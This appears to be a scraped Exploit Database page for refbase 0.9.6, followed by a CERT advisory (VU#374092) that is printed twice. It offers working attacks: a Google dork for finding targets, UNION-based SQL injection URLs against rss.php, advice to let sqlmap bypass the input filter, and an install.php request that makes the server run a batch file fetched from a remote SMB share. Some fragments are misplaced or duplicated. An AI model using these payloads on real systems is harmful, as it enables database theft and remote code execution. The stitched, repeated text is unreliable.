# Exploit Title: Refbase <= 0.9.6 rss.php where parameter SQL Injection
# Google Dork: "powered by refbase"
# Date: 23 Sep 2015
# Exploit Author: Mohab Ali
# @0xAli
# Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database
# Software Link: http://sourceforge.net/projects/refbase/
# Reference: https://www.kb.cert.org/vuls/id/374092
# Version: 0.8, 0.9, 0.9.5, 0.9.6
# Tested on: WAMP (Windows)
# CVE : CVE-2015-6009
# Solution: Vulnerability hasn't been patched yet.

**Summary **
Refbase v 0.9.6 and earlier versions have an SQL injection vulnerability because of the insufficient validation when passing user supplied input to be passed to the database.

** Vulnerable code **
################################################################################
#Line 35 : $queryWhereClause = $_REQUEST['where'];
#Line 86 : $sanitizedWhereClause = extractWHEREclause(" WHERE " . $queryWhereClause);
#Line 100: $sqlQuery .= " FROM $tableRefs WHERE " . $sanitizedWhereClause;
#Line 123: $result = queryMySQLDatabase($query);
################################################################################

** Exploit POCs **
/rss.php?where=1+and+5=(substr(@@version,1,1))-- -If it’s true then the mysql version is > 5
/rss.php?where='nonexistent'+union+all(select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,concat('version:',@@version,''),34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50)-- -
/rss.php?where='nonexistent'+union+all(select+1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41)-- -

[!] Version 0.8 and 0.9 provide no validation, but versions 0.9.5 and 0.9.6 provide some filtering so you better let sqlmap handle it.
[!] The GET parameter "where" is vulnerable to SQL injection despite being filtered by a custom function called extractWHEREclause() it’s still can be bypassed to inject other queries.
The extractWHEREclause() function which is defined in include.inc.php and it removes any additional MySQL keywords.
preg_replace("/^.*? WHERE (.+?)(?= ORDER BY| LIMIT| GROUP BY| HAVING| PROCEDURE| FOR UPDATE| LOCK IN|[ ;]+(SELECT|INSERT|UPDATE|DELETE|CREATE|ALTER|DROP|FILE)\b|$).*?$/i", "\\1", $query);
But it can be bypassed.

# Solution: Remove the install.php file after the installation

**Summary **
Refbase v 0.9.6 and earlier versions have an SQL injection vulnerability because of the insufficient validation when passing user supplied input to be passed to the database.

[!] You have to know the correct MySQL credentials.

** Vulnerable code **
################################################################################

# Exploit Title: Refbase <= 0.9.6 install.php pathToMYSQL parameter RCE (Windows)
# Google Dork: "powered by refbase"
# Public Disclosure Date: 21 Sep 2015
# Exploit Author: Mohab Ali
# @0xAli
# Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database
# Software Link: http://sourceforge.net/projects/refbase/
# Reference: https://www.kb.cert.org/vuls/id/374092
# Version: 0.9.6 and earlier. 0.6.1 and prior versions are not vulnerable.
# Tested on: Windows
# CVE : CVE-2015-6008
# Solution: Remove the install.php file after the installation

**Summary **
Refbase v 0.9.6 and earlier versions have an RCE vulnerability because of the insufficient validation when passing user supplied input to be executed by the system.

[!] You have to know the correct MySQL credentials and this doesn't appear to be exploitable on Linux since (AFAIK) it can't execute scripts remote smb shares by default.

** Vulnerable code **
################################################################################
#Line 62: $pathToMYSQL = $_POST['pathToMYSQL'];
#Line 67: $databaseStructureFile = $_POST['databaseStructureFile'];
#Line 429: exec($pathToMYSQL . " -h " . $hostName . " -u " . $adminUserName . " -p" .$adminPassword . " --database=" . $databaseName . " < " . $databaseStructureFile . " 2>&1", $resultArray);
################################################################################

[*] pathToMYSQL and databaseStructureFile can't be empty, and has to be real file. And they can't contain ';' or '|'
[*] To exploit this in Windows you can provide an executable on a remote share and execute it.

** Exploit POC **

Request:
formType=install&submit=Install&adminUserName=root&adminPassword=123&pathToMYSQL=%5C%5CSERVER_IP%5CShare%5Cexec.bat&databaseStructureFile=.%2Finstall.sql&pathToBibutils=&defaultCharacterSet=latin1&submit=Install

Executed command:
\\SERVER_IP\Share\exec.bat -h localhost -u root -p123 --database=literature < ./install.sql 2>&1

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Web Reference Database (refbase) contains multiple vulnerabilities

#### Vulnerability Note VU#374092

Original Release Date: 2015-09-21 | Last Revised: 2015-09-21

---

### Overview

Web Reference Database (refbase) versions 0.9.6 and possibly earlier contain multiple vulnerabilities.

### Description

| Web Reference Database (refbase) versions 0.9.6 and possibly earlier contain multiple vulnerabilities.  [**CWE-352**](https://cwe.mitre.org/data/definitions/352.html)**: Cross-Site Request Forgery (CSRF)** - CVE-2015-6007The application does not employ cross-site request forgery protection (CSRF) mechanisms, such as CSRF tokens.[**CWE-78**](https://cwe.mitre.org/data/definitions/78.html)**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')** - CVE-2015-6008The install.php file is vulnerable to command injection attacks via the adminPassword POST parameter. An attacker can also pass malicious remote file paths to the pathToMYSQL and databaseStructureFile POST parameters. Assuming the target system is able to access those remote paths, it will execute them within the context of the server application's user.[**CWE-89**](https://cwe.mitre.org/data/definitions/89.html)**: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')** - CVE-2015-6009The install.php file is vulnerable to SQL Injection via the defaultCharacterSet POST parameter.The rss.php file is vulnerable to SQL Injection via the where GET parameter.The search.php file is vulnerable to SQL Injection via the sqlQuery GET parameter.[**CWE-79**](https://cwe.mitre.org/data/definitions/79.html)**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')** - CVE-2015-6010The install.php file is vulnerable to reflected cross-site scripting (XSS) attacks via the adminUserName, pathToMYSQL, databaseStructureFile, and pathToBibutils POST parameters. The error.php file is vulnerable to reflected XSS attacks via the errorNo and errorMsg GET parameters.The duplicate\_manager.php file is vulnerable to a reflected XSS attack via the viewType GET parameter.The query\_manager.php file contains multiple reflected XSS vulnerabilities. When the customQuery GET parameter is set to "1", the queryAction, displayType, citeOrder, sqlQuery, showQuery, showLinks, and showRows GET parameters are all vulnerable to reflected XSS attacks. When customQuery is not provided or set to "1", only the queryID GET parameter is vulnerable. It should be noted that while the query\_manager.php file is only accessible by authenticated users, the lack of CSRF protections could still enable unauthenticated attackers to exploit these XSS vulnerabilities.The import.php file is vulnerable to reflected XSS attacks via the sourceText and sourceIDs POST variables.The update.php file is vulnerable to reflected XSS attacks via the adminUserName POST parameter.The application is vulnerable to stored XSS attacks through the modify.php file's typeName and fileName POST parameters. When rendered by the search.php and advanced\_search.php pages, the injected Javascript in these stored values will not be safely escaped.[**CWE-91**](https://cwe.mitre.org/data/definitions/91.html)**: XML Injection (aka Blind XPath Injection)** - CVE-2015-6011Arbitrary XML can be injected via the unapi.php file's id GET parameter, as well as the sru.php file's stylesheet GET parameter.[**CWE-601**](https://cwe.mitre.org/data/definitions/601.html)**: URL Redirection to Untrusted Site ('Open Redirect')** - CVE-2015-6012Multiple pages are vulnerable to open redirection attacks by passing a referrer GET parameter with a malicious URL as its value in the request.The CVSS score reflects CVE-2015-6008. |

### Impact

| A remote, unauthenticated attacker could submit valid requests to the server on behalf of authenticated users, execute arbitrary scripts in the context of a victim's browser, directly read, write, and modify arbitrary data in the application's database, redirect victims to malicious web addresses, and execute arbitrary code on the server. |

### Solution

| The refbase maintainers have not published a new release at this time. However, they have committed fixes for some of these issues to the [bleeding-edge](http://sourceforge.net/p/refbase/code/HEAD/tree/branches/bleeding-edge/) SVN branch. To apply these fixes, users can [download the latest repository snapshot](http://sourceforge.net/code-snapshots/svn/r/re/refbase/code/refbase-code-1406-branches-bleeding-edge.zip).The SQL Injection vulnerabilities in rss.php and search.php have not yet been fixed. According to the project maintainers, the vulnerabilities in install.php and update.php will not be fixed (see workaround below). For users who cannot upgrade at this time or do not wish to use an unofficial release of this software, please consider using the following workarounds: |
| --- |

| **Manually remove install.php and update.php**The install.php and update.php files are administrative files for installing and updating the application. When they are not needed, project maintainers suggest manually removing these vulnerable files from production deployments of the application.**Restrict access**Restrict access to the application to trusted users and networks. |

### Overview

Web Reference Database (refbase) versions 0.9.6 and possibly earlier contain multiple vulnerabilities.

### Description

| Web Reference Database (refbase) versions 0.9.6 and possibly earlier contain multiple vulnerabilities.  [**CWE-352**](https://cwe.mitre.org/data/definitions/352.html)**: Cross-Site Request Forgery (CSRF)** - CVE-2015-6007The application does not employ cross-site request forgery protection (CSRF) mechanisms, such as CSRF tokens.[**CWE-78**](https://cwe.mitre.org/data/definitions/78.html)**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')** - CVE-2015-6008The install.php file is vulnerable to command injection attacks via the adminPassword POST parameter. An attacker can also pass malicious remote file paths to the pathToMYSQL and databaseStructureFile POST parameters. Assuming the target system is able to access those remote paths, it will execute them within the context of the server application's user.[**CWE-89**](https://cwe.mitre.org/data/definitions/89.html)**: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')** - CVE-2015-6009The install.php file is vulnerable to SQL Injection via the defaultCharacterSet POST parameter.The rss.php file is vulnerable to SQL Injection via the where GET parameter.The search.php file is vulnerable to SQL Injection via the sqlQuery GET parameter.[**CWE-79**](https://cwe.mitre.org/data/definitions/79.html)**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')** - CVE-2015-6010The install.php file is vulnerable to reflected cross-site scripting (XSS) attacks via the adminUserName, pathToMYSQL, databaseStructureFile, and pathToBibutils POST parameters. The error.php file is vulnerable to reflected XSS attacks via the errorNo and errorMsg GET parameters.The duplicate\_manager.php file is vulnerable to a reflected XSS attack via the viewType GET parameter.The query\_manager.php file contains multiple reflected XSS vulnerabilities. When the customQuery GET parameter is set to "1", the queryAction, displayType, citeOrder, sqlQuery, showQuery, showLinks, and showRows GET parameters are all vulnerable to reflected XSS attacks. When customQuery is not provided or set to "1", only the queryID GET parameter is vulnerable. It should be noted that while the query\_manager.php file is only accessible by authenticated users, the lack of CSRF protections could still enable unauthenticated attackers to exploit these XSS vulnerabilities.The import.php file is vulnerable to reflected XSS attacks via the sourceText and sourceIDs POST variables.The update.php file is vulnerable to reflected XSS attacks via the adminUserName POST parameter.The application is vulnerable to stored XSS attacks through the modify.php file's typeName and fileName POST parameters. When rendered by the search.php and advanced\_search.php pages, the injected Javascript in these stored values will not be safely escaped.[**CWE-91**](https://cwe.mitre.org/data/definitions/91.html)**: XML Injection (aka Blind XPath Injection)** - CVE-2015-6011Arbitrary XML can be injected via the unapi.php file's id GET parameter, as well as the sru.php file's stylesheet GET parameter.[**CWE-601**](https://cwe.mitre.org/data/definitions/601.html)**: URL Redirection to Untrusted Site ('Open Redirect')** - CVE-2015-6012Multiple pages are vulnerable to open redirection attacks by passing a referrer GET parameter with a malicious URL as its value in the request.The CVSS score reflects CVE-2015-6008. |
